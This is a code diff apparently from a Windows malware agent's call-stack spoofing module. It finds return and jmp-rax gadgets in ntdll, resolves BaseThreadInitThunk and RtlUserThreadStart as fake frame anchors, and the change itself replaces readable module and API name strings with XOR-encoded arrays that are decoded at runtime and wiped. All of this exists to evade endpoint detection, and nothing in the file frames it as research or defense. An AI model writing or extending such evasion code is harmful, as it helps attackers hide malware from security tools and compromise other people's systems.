@@ -3,6 +3,7 @@
  */
 #include "agent.h"
 #include "stack_spoof.h"
+#include "api_resolve.h"
 
 GADGET_CACHE g_GadgetCache = {0};
 
@@ -61,8 +62,16 @@ static void *_find_gadget(HMODULE hMod, const unsigned char *pattern, SIZE_T pat
 BOOL spoof_init(void) {
     if (g_GadgetCache.initialized) return TRUE;
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
+    HMODULE hNtdll = GetModuleHandleA(_sn);
+    SecureZeroMemory(_sn, sizeof(_sn));
+
+    char _sk[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sk[_i];_i++) _sk[_i]^=0x5A;
+    HMODULE hK32 = GetModuleHandleA(_sk);
+    SecureZeroMemory(_sk, sizeof(_sk));
+
     if (!hNtdll || !hK32) return FALSE;
 
     _get_module_range(hNtdll, &g_GadgetCache.ntdllBase, &g_GadgetCache.ntdllSize);
@@ -77,10 +86,17 @@ BOOL spoof_init(void) {
     g_GadgetCache.jmpRaxGadget = _find_gadget(hNtdll, jmpRaxPattern, 2);
 
     /* Resolve well-known frame anchors */
+    char _sb[] = {'B'^0x5A,'a'^0x5A,'s'^0x5A,'e'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'T'^0x5A,'h'^0x5A,'u'^0x5A,'n'^0x5A,'k'^0x5A,0};
+    for(int _i=0;_sb[_i];_i++) _sb[_i]^=0x5A;
     g_GadgetCache.baseThreadInitThunk =
-        (void *)GetProcAddress(hK32, "BaseThreadInitThunk");
+        (void *)GetProcAddress(hK32, _sb);
+    SecureZeroMemory(_sb, sizeof(_sb));
+
+    char _sr[] = {'R'^0x5A,'t'^0x5A,'l'^0x5A,'U'^0x5A,'s'^0x5A,'e'^0x5A,'r'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'S'^0x5A,'t'^0x5A,'a'^0x5A,'r'^0x5A,'t'^0x5A,0};
+    for(int _i=0;_sr[_i];_i++) _sr[_i]^=0x5A;
     g_GadgetCache.rtlUserThreadStart =
-        (void *)GetProcAddress(hNtdll, "RtlUserThreadStart");
+        (void *)GetProcAddress(hNtdll, _sr);
+    SecureZeroMemory(_sr, sizeof(_sr));
 
     g_GadgetCache.initialized =
         (g_GadgetCache.retGadget != NULL);
